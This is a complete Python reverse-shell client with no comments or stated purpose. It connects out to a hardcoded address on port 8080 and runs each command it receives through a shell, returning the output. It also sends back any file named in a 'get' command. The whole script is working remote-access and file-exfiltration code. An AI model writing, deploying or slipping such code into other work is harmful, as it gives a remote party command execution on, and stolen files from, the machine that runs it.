import socket
import subprocess
import os

SERVER_IPADDR = "192.168.1.205"
SERVER_PORT = 8080

def clientGetData(socketClient,filename):
    
    if os.path.exists(filename):
        with open(filename,"rb") as fileObject:
            fileContent = fileObject.read(8192)
            while len(fileContent) > 0:
                socketClient.send(fileContent)
                fileContent = fileObject.read(8192)
                   
            socketClient.send("END".encode())   
    else:
        socketClient.send("File No Found".encode())


def clientconnect():
    socketObj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socketObj.connect((SERVER_IPADDR, SERVER_PORT))
    
    while True:
        command = socketObj.recv(8192).decode()
       
        if 'terminate' in command:
            socketObj.close()
            break
        elif 'get' in command:
            getString , filenameString = command.split("*")
            try:
                clientGetData(socketObj,filenameString)
            except:
                pass

        else:
            results = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            socketObj.send(results.stdout.read())
            socketObj.send(results.stderr.read())
        

if __name__ == "__main__":
    clientconnect()